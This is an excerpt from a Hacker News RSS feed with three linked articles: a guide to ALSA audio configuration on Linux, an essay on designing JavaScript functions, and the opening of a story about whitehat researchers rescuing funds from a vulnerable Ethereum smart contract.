            <pubDate>Thu, 24 Sep 2020 17:23:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ALSA, Exposed]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580892">thread link</a>) | @ashitlerferad
<br/>
September 24, 2020 | https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed | <a href="https://web.archive.org/web/*/https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The clearest ALSA documentation in the universe.</p><a name="alsa-exposed/a-short-essay" href="#alsa-exposed/a-short-essay"><h2><span><span>1</span></span><span>A short essay</span></h2></a><p>ALSA, one of the last great mysteries of Linux, is notoriously hard to use, mostly stemming from the atrocious (read: <strike>almost</strike> entirely nonexistent) end user documentation.</p><p>The internet is scattered with outdated, incorrect, incomplete, confused information written by monkeys at Linux terminals trying random ALSA configs in an attempt to get sound to come out. Being a representative of monkeys myself, I‚Äôve also spent days (that is, multiples of 24 hours) trying to get ALSA to behave sanely.</p><p>I finally jumped into the source, <code>strace</code>d, dug through configs, library documentation, searched my soul and now I‚Äôve cracked this banana! And it‚Äôs actually not bad. Here‚Äôs everything you need to know, once and for all.</p><a name="alsa-exposed/concepts" href="#alsa-exposed/concepts"><h2><span><span>2</span></span><span>Concepts</span></h2></a><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h3><span><span>2</span><span>1</span></span><span>Cards</span></h3></a><p>Any audio devices (audio chips, USB audio hardware) are considered <code>card</code>s in ALSA.</p><p><code>card</code>s have three identifiers:</p><ul><li><p>Number: This is a number starting from 0 based on the order the kernel found the device. This is useless, because it may be different each boot (and <em>will</em> be different each boot if you plug in and unplug things).</p><p>Edit: gen2brain notes you can control the number using <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6alrxx?utm_source=share&amp;utm_medium=web2x&amp;context=3">kernel module options</a></p></li><li><p>ID: This is a (hopefully unique and consistent) text identifier for a card. My built in device has the id <code>Generic</code>.</p></li><li><p>Name: This is another text identifier, but you can‚Äôt use it anywhere. Maybe it will help you identify the device or something‚Ä¶ but don‚Äôt count on it. My built in device has the name <code>HD-Audio Generic</code>.</p></li></ul><p>When referring to cards in config, programs, etc. you can use the number and ID interchangeably.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h3><span><span>2</span><span>2</span></span><span>Devices</span></h3></a><p><code>device</code>s are subdivisions of a card. For example, my built in audio device has 3 <code>device</code>s: an analog input + output, a digital output (maybe HDMI?), and an alt analog input. I can configure the analog input and alt input on the device to be microphone-in or line-in independently.</p><p>Same as with <code>card</code>s, <code>device</code>s have three identifiers:</p><ul><li>Number</li><li>ID</li><li>Name</li></ul><p>Unlike the <code>card</code> number, <code>device</code> numbers are generally consistent so feel free to use them in configs and other places.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h3><span><span>2</span><span>3</span></span><span>Subdevices</span></h3></a><p>Device has at least one subdevice. My subdevices are all called ‚Äúsubdevice 0‚Äù. By default subdevice 0 is used everywhere, so you can mostly not worry about this.</p><p>cathexis08 suggested multiple subdevices may be used to <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">subdivide surround sound systems into areas</a>.</p><a name="alsa-exposed/pcm-pulse-code-modulation" href="#alsa-exposed/pcm-pulse-code-modulation"><h3><span><span>2</span><span>4</span></span><span>PCM (Pulse Code Modulation)</span></h3></a><p>A PCM is an object <em>internal to ALSA</em> that processes audio. PCMs have a (direction) stream which can be playback, capture, or both. PCMs can be chained together, and typically connect to hardware at one end, although they can also be used to route audio to/from a filesystem device, a server, or to drop audio entirely.</p><p>Named PCMs definitions can be templatized, where arguments are provided when they‚Äôre referenced to dynamically define the PCM.  For instance, the built-in <code>hw</code> PCM takes 3 arguments: <code>"hw:CARD,DEVICE,SUBDEVICE"</code> (more details in <a href="#alsa-exposed/default-pcms-and-ctls">Default PCMs and CTLs</a>).</p><a name="alsa-exposed/ctl-control" href="#alsa-exposed/ctl-control"><h3><span><span>2</span><span>5</span></span><span>CTL (Control)</span></h3></a><p>A CTL is an object <em>internal to ALSA</em> processes non-audio data. This is what you see in your mixer: volume controls, toggle controls, multiple-choice selections (like when you can change a device to use different ports), etc.</p><p>You can save and load CTL values using the <code>alsactl</code> CLI and modify the values with <code>alsamixer</code> and other mixing software.</p><p>Like PCMs, CTL definitions can also be templatized.</p><a name="alsa-exposed/slave" href="#alsa-exposed/slave"><h3><span><span>2</span><span>6</span></span><span>Slave</span></h3></a><p>A slave wraps a PCM and allows you to set some audio stream details like bit rate. Generally a slave is just an extra step of indirection to PCM and contains no useful data itself.</p><a name="alsa-exposed/client" href="#alsa-exposed/client"><h3><span><span>2</span><span>7</span></span><span>Client</span></h3></a><p>A client is a piece of software that uses ALSA, via PCMs and CTLs.  Most clients use the default PCM/CTL, but some provide methods for explicitly selecting the PCM/CTL.</p><p>With <code>mpv</code> you can select a PCM named <code>hello</code> with <code>--audio-device=alsa/hello</code>, otherwise it will use the default PCM.  Templatized PCMs also work, like <code>--audio-device=alsa/hw:Generic</code>.</p><p>Similarly, if you have a CTL named <code>dog</code> you can change the levels with <code>alsamixer -D dog</code> (the help text uses the word device incorrectly) and, templatized, <code>alsamixer -D hw:Generic</code>.</p><a name="alsa-exposed/listing-your-devices" href="#alsa-exposed/listing-your-devices"><h2><span><span>3</span></span><span>Listing your devices</span></h2></a><a name="alsa-exposed/with-aplay-arecord" href="#alsa-exposed/with-aplay-arecord"><h3><span><span>3</span><span>1</span></span><span>With <code>aplay</code>/<code>arecord</code></span></h3></a><p>The easiest way to list devices is:</p><p><code>aplay -l
</code></p><p>or</p><p><code>arecord -l
</code></p><p>which produce output like this:</p><p><code>**** List of PLAYBACK Hardware Devices ****
card 1: Generic [HD-Audio Generic], device 0: ALC887-VD Analog [ALC887-VD Analog]
  Subdevices: 0/1
  Subdevice #0: subdevice #0
card 1: Generic [HD-Audio Generic], device 1: ALC887-VD Digital [ALC887-VD Digital]
  Subdevices: 1/1
  Subdevice #0: subdevice #0
</code></p><p>The format is:</p><p><code>card CARD_NUMBER: CARD_ID [CARD_NAME], device DEVICE_NUMBER: DEVICE_ID [DEVICE_NAME]
  ...
  Subdevice #SUBDEVICE_NUMBER: SUBDEVICE_NAME
</code></p><a name="alsa-exposed/from-proc" href="#alsa-exposed/from-proc"><h3><span><span>3</span><span>2</span></span><span>From <code>/proc</code></span></h3></a><p>Alternatively, you can go directly to the <code>/proc</code> tree.</p><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h4><span><span>3</span><span>2</span><span>1</span></span><span><code>card</code>s</span></h4></a><p>You can list <code>card</code>s with</p><p><code>cat /proc/asound/cards
</code></p><p>This produces output like:</p><p><code> 0 [USB            ]: USB-Audio - Realtek Audio USB
                      Generic Realtek Audio USB at usb-0000:03:00.0-6, high speed
 1 [Generic        ]: HDA-Intel - HD-Audio Generic
                      HD-Audio Generic at 0xf7800000 irq 53
</code></p><p>On the first line, <code>0</code> is the <code>card</code> number, <code>USB</code> (remove trailing spaces) is the <code>card</code> ID, <code>Realtek Audio USB</code> is the <code>card</code> name.  <code>USB-Audio</code> may be <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">related to the kernel driver</a> providing that device.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h4><span><span>3</span><span>2</span><span>2</span></span><span><code>device</code>s</span></h4></a><p>Underneath <code>/proc/asound/cardNUMBER/</code> you‚Äôll see nodes like <code>pcm1c/</code> and <code>pcm2p/</code>. <code>1</code> and <code>2</code> are the <code>device</code> number and <code>p</code> or <code>c</code> stands for playback or capture.</p><p>Using my system as an example, <code>cat /proc/asound/card1/pcm0p/info</code> shows:</p><p><code>card: 1
device: 0
subdevice: 0
stream: PLAYBACK
id: ALC887-VD Analog
name: ALC887-VD Analog
subname: subdevice #0
class: 0
subclass: 0
subdevices_count: 1
subdevices_avail: 1
</code></p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h4><span><span>3</span><span>2</span><span>3</span></span><span><code>subdevice</code>s</span></h4></a><p>Underneath <code>/proc/asound/card.../pcm.../</code> you‚Äôll see nodes like <code>sub0</code>, <code>sub1</code>.  <code>0</code> and <code>1</code> are the subdevice numbers.</p><p>In that directory, <code>cat</code> <code>info</code> and other nodes for details.</p><a name="alsa-exposed/configuring-alsa" href="#alsa-exposed/configuring-alsa"><h2><span><span>4</span></span><span>Configuring ALSA</span></h2></a><p>Each client loads <code>/usr/share/alsa/alsa.conf</code> at startup.</p><p>That config defines a number of other configs in <code>@hooks</code> which are all merged together, with later ones overriding earlier ones. On my system this pulls in:</p><ol start="1"><li><code>/etc/alsa.d/*.conf</code> in alphanumeric order</li><li><code>/etc/asound.conf</code></li><li><code>~/.asoundrc</code></li><li><code>~/.config/alsa/asoundrc</code></li></ol><p>If you change the config, you need to restart each ALSA client for the changes to take effect.</p><a name="alsa-exposed/configuration-syntax" href="#alsa-exposed/configuration-syntax"><h3><span><span>4</span><span>1</span></span><span>Configuration syntax</span></h3></a><p>The configuration is a tree, with top level keys:</p><ul><li>pcm</li><li>ctl</li><li>slave_pcm</li><li>timer</li><li>rawmidi</li><li>hwdep</li><li>‚Ä¶</li></ul><p>Each one is a dictionary with key value pairs of names and objects of the given type: <code>pcm</code> contains PCM definitions, <code>ctl</code> of CTL definitions, etc. <code>pcm</code> and <code>ctl</code> are expected to have a key <code>default</code> for clients that don‚Äôt explicitly choose one (most software).</p><p>The config file itself consists of multiple statements of the form:</p><p><code>KEY1.KEY2.KEY3... VALUE
</code></p><p><code>VALUE</code> can be a <code>"string"</code>, a number, a <code>compound</code> - a value that has multiple subproperties, or an absolute (top rooted) reference/alias to another value like <code>pcm.default</code>.</p><p>You can use <code>{</code> <code>}</code> with compounds to avoid writing the whole chain of keys in every statement:</p><p><code>pcm.a.b 4
pcm.a.c "hi"
</code></p><p>is equivalent to</p><p><code>pcm.a {
    b 4
    c "hi"
}
</code></p><p>This is also equivalent:</p><p><code>pcm.a {
    b 4
}
pcm.a {
    c "hi"
}
</code></p><p><code>;</code> and <code>,</code> end statements but they aren‚Äôt necessary. You can also put a <code>=</code> between the key and value if you really want to.</p><a name="alsa-exposed/assignment-modifiers" href="#alsa-exposed/assignment-modifiers"><h4><span><span>4</span><span>1</span><span>1</span></span><span>Assignment modifiers</span></h4></a><p>No values ‚Äúexist‚Äù until you set them in the config, even if there‚Äôs a default value.  Alsa uses knowledge of this ‚Äúexistance‚Äù to raise spurious when loading your config.</p><p>The errors are controlled by modifiers you can prefix on keys, like:</p><p><code>+a "hi"
</code></p><p>The four modifiers are:</p><ul><li><code>+
</code><p>(default if no modifier specified)</p><p>Creates the config value if it doesn‚Äôt exist, and sets it. No config values exist until you specify them, so this is purely determined by other config file statements.</p><p>If the value already exists, the new value must have the same type or else you‚Äôll get an error like:</p><code>ALSA lib conf.c:1446:(parse_def) KEY is not a TYPE
</code><p>For example, if you specify <code>pcm.default</code> instead of <code>pcm.!default</code> you‚Äôll probably see</p><code>ALSA lib conf.c:1446:(parse_def) default is not a compound
</code><p>since it‚Äôs already defined as an alias/reference, not a compound, in the generic packaged configurations.</p></li><li><code>-
</code><p>Sets the value, but doesn‚Äôt create it. If the value doesn‚Äôt exist and you try to set it with this, you‚Äôll get the error:</p><code>ALSA lib conf.c:1432:(parse_def) KEY does not exists
</code></li><li><code>?
</code><p>Only sets the value if it‚Äôs not already set. This is mostly used by package/distro maintainers that are providing default configurations.</p></li><li><code>!
</code><p>Creates, sets, and changes the type of the value.</p></li></ul><p><strong>TLDR</strong>: Just use the default until you get an error and then try <code>!</code>.</p><a name="alsa-exposed/special-statements-and-compounds" href="#alsa-exposed/special-statements-and-compounds"><h4><span><span>4</span><span>1</span><span>2</span></span><span>Special statements and compounds</span></h4></a><p>An <code>@</code> begins a special statement, like <code>@func</code> or <code>@args</code>.  How this works and the syntax seems to differ based on the symbol, so I won‚Äôt provide a general guide.</p><a name="alsa-exposed/arguments" href="#alsa-exposed/arguments"><h5><span><span>4</span><span>1</span><span>2</span><span>1</span></span><span>Arguments</span></h5></a><p>Named PCMs and CTLs can be parameterized to turn them into reusable templates.</p><p>For example, <code>slave.pcm "hw:Dog,5"</code> will instantiate the <code>pcm.hw</code> object as a template, where <code>Dog</code> is the first argument, <code>5</code> is the second, etc.</p><p>Arguments are specified with the special statement <code>@args</code> followed by <code>@arg.NAME</code> for each positional argument given name in the former. I don‚Äôt know the details on this, but you should be able to find examples in <code>/usr/share/alsa/alsa.conf</code> and other config files.</p><a name="alsa-exposed/environment-variables" href="#alsa-exposed/environment-variables"><h4><span><span>4</span><span>1</span><span>3</span></span><span>Environment variables</span></h4></a><p>A compound containing just <code>{ @func getenv vars [ ENVVAR1 ENVVAR2 ... ] default VALUE }</code> will turn into a string from the specified environment variable. Each environment variable is queried and the first to match is used, otherwise <code>VALUE</code>.</p><a name="alsa-exposed/pcm-config" href="#alsa-exposed/pcm-config"><h3><span><span>4</span><span>2</span></span><span>PCM config</span></h3></a><p>A named PCM config is defined as:</p><p><code>pcm.NAME {
    type TYPE
    ...
}
</code></p><p>and referred to like:</p><p><code>{
...
    playback.pcm "NAME"
...
}
</code></p><p>(via the <code>playback</code> slave field), or defined inline without a name like:</p><p><code>{
...
    playback.pcm {
        type TYPE
        ...
    }
...
}
</code></p><p>See more information in <a href="#alsa-exposed/slave-config">Slave config</a>.</p><p>All configuration parameters depend on <code>TYPE</code>. All types are documented with their ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</a></em></p>]]>
            </description>
            <link>https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580892</guid>
            <pubDate>Thu, 24 Sep 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crafting Functions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580885">thread link</a>) | @stopachka
<br/>
September 24, 2020 | https://stopa.io/post/251 | <a href="https://web.archive.org/web/*/https://stopa.io/post/251">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>We write so many functions in our programs that they become second nature before we know it. Like ants in a colony, they are numerous beyond imagination and they come together to form some surprisingly complex systems.</p><p>It begs the question: how do we write good functions? It can seem trivial: they√¢‚Ç¨‚Ñ¢re just like ants after-all. But there is leverage in the answer: the right decisions multiply throughout your codebase and bubble up into great design.</p><p>I think there are about three key ideas you can employ to craft good functions. I wanted to share them with you.</p><p>Let√¢‚Ç¨‚Ñ¢s start with an example. We have an app, and we want to export some data in a JSON format. Here√¢‚Ç¨‚Ñ¢s what a function for that could look like:</p><pre><code>function exportFile() { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const jsonStr = JSON.stringify(exportableData); // '{"data": {...
    const fileURL = saveFile("export.json", jsonStr); // https://foo.com/export.json
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Seems straight forward: To export as JSON, we first get our data. Now, this data may have some sensitive info, so we clean that up and transform into something exportable; ExportableData. Once we have that, we get a string representation, save the file, and badabing, badaboom, we√¢‚Ç¨‚Ñ¢re done. </p><p>Okay, we√¢‚Ç¨‚Ñ¢ve got something working well.</p><p>But life moves on and our program needs to evolve. Instead of just exporting JSON, we need to do more: <strong>we also need to export a CSV file</strong>. </p><p>How do we do that?</p><p>The first thing we notice, is that exporting a CSV is very similar to exporting JSON. Can we abstract <code>exportFile</code>?</p><p>One thing we can do, is to introduce a new flag: something like <code>exportFile(/*isCSV=*/ true)</code> </p><pre><code>function exportFile(isCSV) { 
  ...
  let fileURL
  if (isCSV) { 
    const csvStr = toCSVStr(exportableData)
    fileURL = saveFile("export.csv", jsonStr);
  } else { 
    const jsonStr = JSON.stringify(exportableData);
    fileURL = saveFile("export.json", jsonStr);
  }
  ...</code></pre><p>By introducing this flag, we can conditionally produce a different <code>fileURL</code>: one for CSV and one for JSON. With that we see the first concept for abstraction: configuration. You pass some configuration, and you leave it to your function to figure what to do. </p><p>So, is it a good idea? </p><h2>The key <em>advantage</em> is that our logic is centralized.</h2><p>With configuration, the caller is limited in what they can do: they can only provide flags. All the true logic stays inside <code>exportFile</code>. This means that callers of the function can√¢‚Ç¨‚Ñ¢t go crazy and do something unsupported. And that could give us some peace of mind.</p><h2>The key <em>disadvantage</em> is that√¢‚Ç¨¬¶our logic is centralized.</h2><p>This will work, but let√¢‚Ç¨‚Ñ¢s think about it. First, notice that in order to understand <code>exportFile</code> now, we need to understand both the CSV and JSON case. Imagine if someone opens up <code>exportFile</code> to figure out what it does:  if they <em>only</em> cared about JSON, they now have to understand more logic than they needed. Anyone who changes the logic for CSV, may also end up breaking JSON. <code>**exportFile**</code> <strong>has become</strong> <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank"><strong>complected</strong></a><strong>.</strong></p><p>Notice also, that because the caller of this function can <em>only</em> provide flags, their hands are tied for use-cases that you didn√¢‚Ç¨‚Ñ¢t support. This was supposed to give you peace of mind, but it certainly can frustrate callers. imagine if they wanted to support XML, what could they do? They√¢‚Ç¨‚Ñ¢d have to edit <code>exportFile</code> to support this case. (God forbid they edit it to be something like <code>exportFile(isCSV, isXML)</code> √¢‚Ç¨‚Äù now you have invariant conditions on your hands). By being so specific, you√¢‚Ç¨‚Ñ¢ve chosen to make your function less abstract √¢‚Ç¨‚Äù this of course means that it is less powerful.  <code>**exportFile**</code> <strong>has become hard to extend</strong></p><h2>For better or worse, configuration gives the caller the least amount of power</h2><p>If you imagine a sort power spectrum, where the caller has the least power on the left, and most power on the right, configuration would be on the left. You control what the caller does so tightly that it gives your certainty, but makes your function more complex and less useful. </p><p>Say you wanted to address the problems, and move to the right of this spectrum, what could you do? </p><p>Well, if you look at what we wrote, we can notice that the only part that is <em>really</em> different, is the bit about taking <code>exportData</code>, and creating a <code>fileURL</code>. </p><pre><code>...
const exportableData = toExportableData(data); // ExportableData
... // *This can be different! Somehow we need to get a fileURL* 
setFileURL(fileURL);
...</code></pre><p>So one thing we can do is this: instead of providing a flag, we can provide a function: </p><pre><code>function exportFile(exportableDataToFileURL) { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const fileURL = exportableDataToFileURL(exportableData)
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Now, for JSON, we can write </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.json", JSON.stringify(exportableData));
})</code></pre><p>and for CSV we can write: </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.csv", toCSVStr(exportableData));
})</code></pre><p>Oky doke, this is cool. </p><h2>The key <em>advantage</em> is that you give the caller more power</h2><p>With this we solve both of the problems we had with configuration. Now if someone looks under the hood at <code>exportFile</code>, they won√¢‚Ç¨‚Ñ¢t see unrelated code about csv. If they wanted to extend to XML, they can simply provide a different function. We√¢‚Ç¨‚Ñ¢ve given the caller much more power</p><h2>The key <em>disadvantage</em> is that it can be either too powerful or not powerful enough</h2><p>We√¢‚Ç¨‚Ñ¢ve abstracted further, but there is a price there. The first is, that we <em>think</em> we know that what we <em>really</em> need to pass outwards is <code>exportableData</code>, and what we need to return is a <code>fileURL</code>. What if we were wrong? For example, some may need a slightly different data format √¢‚Ç¨‚Äù instead of <code>exportableData</code> they need <code>someOtherKindOfExportableData</code>. By the time we figured that out, it√¢‚Ç¨‚Ñ¢s possible that there are numerous new usages of <code>exportFile</code>, which we√¢‚Ç¨‚Ñ¢ll have to support as we evolve this function.</p><p>One way we could have prevented this, is to have stuck with configuration. This way, anyone who wanted to support something would have to funnel through this function, which would give us time to think about what the best abstraction was. </p><p>Another way, would have been if this function was abstracted even further, so callers could have easily supported <code>someOtherKindOfExportableData</code>.</p><h2>Inversion lies in the middle of the power spectrum</h2><p>Inversion is more powerful than configuration, but it√¢‚Ç¨‚Ñ¢s not the most powerful method. This can be a great choice, but you risk either being too powerful and exposing errors, or not being powerful enough and restricting callers. </p><p>We know the less powerful option: configuration. What would the most powerful one look like?</p><p>The next thing we may notice, is that our <code>exportFile</code> function is actually built up some building blocks that could be useful for a bunch of different things. For example, many functions may want a loading state, or just need to get <code>exportableData</code>, etc. We could create those building blocks:</p><pre><code>function exportJSONFile() { 
  withLoading(() =&gt; saveJSONFile(getExportableData()))
}


function exportCSVFile() { 
  withLoading(() =&gt; saveCSVFile(getExportableData()))
}</code></pre><h2>The key advantage is that the user gets the most power</h2><p>The building blocks that we just built, can be used in a myriad of ways. The user can support CSV, XML, can use <code>isLoading</code> with some other function, and choose to provide a different kind of <code>exportableData</code>.  We√¢‚Ç¨‚Ñ¢ve provided a lot of power for the user.</p><h2>The key disadvantage is that you are the most vulnerable to mistakes</h2><p>The disadvantage though, like in the case of inversion, is that we open ourselves up to a lot of mistakes. What if <code>isLoading</code> was really meant for files, and other things should have been using a different flag? What if people start using <code>saveJSONFile</code>, and pass data that wasn√¢‚Ç¨‚Ñ¢t really an export? These are all cases that we have implicitly allowed with our abstractions. </p><p>There√¢‚Ç¨‚Ñ¢s a further problem: notice that with our first example of <code>exportFile</code>, you the code was more concrete: you could see what was actually happening. When code is more abstract, it√¢‚Ç¨‚Ñ¢s a bit harder to reason about what is <em>actually</em> happening. Now, it can be worth it for the power gains, but if you optimized prematurely, you√¢‚Ç¨‚Ñ¢re just paying this price for nothing. An example of this unnecessary price is <code>saveJSONFile</code> and <code>saveCSVFile</code> √¢‚Ç¨‚Äù if we had <a href="http://number-none.com/blow/john_carmack_on_inlined_code.html" target="_blank">inlined</a> those, the overall composition would still be abstract but more understandable. These are the kind of things to watch out for as you abstract at this level.</p><h2>Composition is at the end of the spectrum</h2><p>And with that, we see that composition gives us the most power, but gives us the most opportunities to shoot ourselves in the foot. Boy can it be worth it though. </p><p>It√¢‚Ç¨‚Ñ¢s funny to notice that with each option, the pro <em>is</em> the con. So how do we pick? I think one heuristic you can use is this: pick the most powerful option you can limited by your confidence. For example, if you have a light understanding of the problem, stay on the lower side of the abstraction spectrum. As you understand more (say, time to introduce XML) you can evolve to the powerful side of the spectrum. When you√¢‚Ç¨‚Ñ¢re <em>very</em> confident, and you can see good use-cases for your building blocks, lean to the most powerful side of the spectrum. </p><p><em>Thanks to Daniel Woelfel, Alex Reichert, Julien Odent for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>
            </description>
            <link>https://stopa.io/post/251</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580885</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping the Dark Forest]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 122 (<a href="https://news.ycombinator.com/item?id=24580879">thread link</a>) | @CyrusL
<br/>
September 24, 2020 | https://samczsun.com/escaping-the-dark-forest/ | <a href="https://web.archive.org/web/*/https://samczsun.com/escaping-the-dark-forest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://samczsun.com/content/images/size/w300/2020/09/109768371_xl.jpg 300w,
                            https://samczsun.com/content/images/size/w600/2020/09/109768371_xl.jpg 600w,
                            https://samczsun.com/content/images/size/w1000/2020/09/109768371_xl.jpg 1000w,
                            https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg" alt="Escaping the Dark Forest">
</figure>
<section>
<div>
<p><em>On September 15, 2020, a small group of people worked through the night to rescue over 9.6MM USD from a vulnerable smart contract. This is our story.</em></p><p>I was about to wrap up for the night when I decided to take another look at some smart contracts.</p><p>I wasn‚Äôt expecting anything interesting, of course. Over the past few weeks I had seen countless yield farming clones launch with the exact same pitch: stake your tokens with us and you could be the next cryptocurrency millionaire. Most were simply forks of well-audited code although some tweaked bits and pieces, sometimes with catastrophic results.</p><p>But amidst all of the noise there was some code I hadn‚Äôt seen before. The contract held over 25,000 Ether, worth over 9,600,000 USD at the time, and would be a very juicy payday for anyone who managed to find a bug in its logic.</p><p>I quickly looked through the code for where Ether is transferred out and found two hits. One of them transferred the Ether to a hardcoded token address, so that could be ignored. The second was a burn function that transferred Ether to the sender. After tracing the usage of this function, I discovered that it would be trivial for anyone to mint tokens to themselves for free, but then burn them in exchange for all of the Ether in the contract. My heart jumped. Suddenly, things had become serious.</p><p>Some digging revealed that the contract I had found was part of <a href="https://lien.finance/">Lien Finance</a>‚Äôs protocol. Unfortunately, their team was anonymous! The only IM platform they supported was Telegram, and I couldn‚Äôt be sure that the admins of that channel were actually protocol developers or just a few early supporters. The last thing I wanted to do was accidentally leak the exploit to the wrong person.</p><p>After browsing their website a little while longer, I noticed that they had worked with ConsenSys Diligence and CertiK for an audit. This seemed like a good avenue, since both ConsenSys and CertiK must have interacted with the developers during their audits. I quickly pinged <a href="https://twitter.com/maurelian_">maurelian</a> on Telegram.</p><figure><img src="https://samczsun.com/content/images/2020/09/image.png" alt=""><figcaption>You never want to be on the receiving end of this message</figcaption></figure><p>Unfortunately, time ticked on, my heart kept pounding, but there was no response from maurelian. It seemed like he had already gone to sleep. Desperate, I sent a message to the ETHSecurity Telegram channel.</p><figure><img src="https://samczsun.com/content/images/2020/09/image-1.png" alt=""><figcaption>Artist's rendering of the message, since I deleted the original</figcaption></figure><p>Within minutes, I got a message from someone I‚Äôd worked with quite a few times in the past - <a href="https://twitter.com/wadealexc">Alex Wade</a>.</p><hr><p>My head had just hit the pillow when I got a knock on my door. It was my roommate: ‚ÄúSam‚Äôs in the ETHSec Telegram asking for anyone from Diligence.‚Äù</p><figure><img src="https://samczsun.com/content/images/2020/09/image-2.png" alt=""><figcaption>It was, in fact, a long night</figcaption></figure><p>Knowing Sam, this couldn‚Äôt be good. I found a channel we‚Äôd set up with Lien a few months ago and an email address. Better than nothing, given their team was anon.</p><p>I was still half asleep. Sam, not wanting to commit details to text, asked for a Zoom call. Groggily wishing I was back in bed, I attempted to gauge the severity of the situation:</p><figure><img src="https://samczsun.com/content/images/2020/09/image-4.png" alt=""><figcaption>Five minutes later, it was clear that the situation called for coffee</figcaption></figure><p>Sam and I reviewed the code together. By this point, Sam had already prepared a sample exploit and was able to confirm the issue on his machine. The conversation quickly turned to discussing options:</p><ol><li>Attempt to exploit the issue ourselves.</li><li>Reach out to Lien and have them go public, urging users to withdraw.</li></ol><p>Neither of these were appealing options. The first was risky because, as discussed in <a href="https://medium.com/@danrobinson/ethereum-is-a-dark-forest-ecc5f0505dff">Ethereum is a Dark Forest</a> by <a href="https://twitter.com/danrobinson">Dan Robinson</a> and <a href="https://twitter.com/gakonst/">Georgios Konstantopoulos</a>, the possibility of our transactions getting frontrun was very real. The second option was similarly risky, as a public announcement would draw attention to the problem and create a window of opportunity for attackers. We needed a third option.</p><p>Recalling a section from <em>Ethereum is a Dark Forest</em>, Sam reached out to <a href="https://twitter.com/epheph">Scott Bigelow</a>:</p><blockquote>If you find yourself in a situation like this, we suggest you reach out to Scott Bigelow, a security researcher who has been studying this topic and has a prototype implementation for a better obfuscator.</blockquote><hr><p>After participating in the recovery attempt from <em>Ethereum is a Dark Forest, </em>which ultimately lost to front-runners, I was hungry for a re-match. I‚Äôve spent time monitoring front-running and designing a simple system that seemed able to fool generalized front-runners, at least for the $200 I‚Äôd been able to test it with. When Sam reached out to me in the late evening with the innocent-sounding ‚Äúmind staying up for another hour or so‚Äù, I couldn‚Äôt wait to try it out! I was already working it out: how I‚Äôd make a few tweaks, stay up a couple hours, feel a sense of accomplishment having helped rescue and return a few thousand dollars of user funds, and get a good night‚Äôs sleep.</p><p>Those plans immediately fell apart when Sam shared the contract with me: ~25,000 ETH, valued at $9.6M, at stake. For as much as I wanted that rematch, $9.6M was way outside my humble script‚Äôs weight class.</p><p><br>For the past few months, I had been trying to establish contacts with miners for this very purpose: white-hat transaction cooperation. If ever there was a time to appeal to a miner to include a transaction without giving front-runners the chance to steal it, it was now. Luckily, <a href="https://twitter.com/tzhen">Tina</a> and I have worked together over the past few months on establishing this cooperation. It seemed like a slim chance at the time, but it was worth a shot: let‚Äôs bring Tina into the rescue attempt to work with a mining pool to mine a private transaction.</p><hr><p>I had just evacuated from the Bobcat forest fire and was sipping on unknown beachy drinks zoning out to the monotonic sound of dark Pacific waves, when a Telegram DM from Sam buzzed me back to a darker reality: ‚Äúfunds at risk, frontrunnable‚Äù. Over the last few weeks, I had been collaborating with Sam and Scott on a research project on MEV and could already guess their ask before they sent it: a direct channel to shield a whitehat tx from getting sniped by the ‚Äúadvanced predators‚Äù in the mempool‚Äôs ‚Äúdark forest‚Äù.</p><p>Since this was a risky move that entailed exposing our strategy to miners, we decided we should first try to get the greenlight from the anonymous Lien team. While Alex was trying to get in contact via ConsenSys-internal channels, we tried to loop in CertiK as well.</p><p>I realized it may take another 4 hours before Certik's 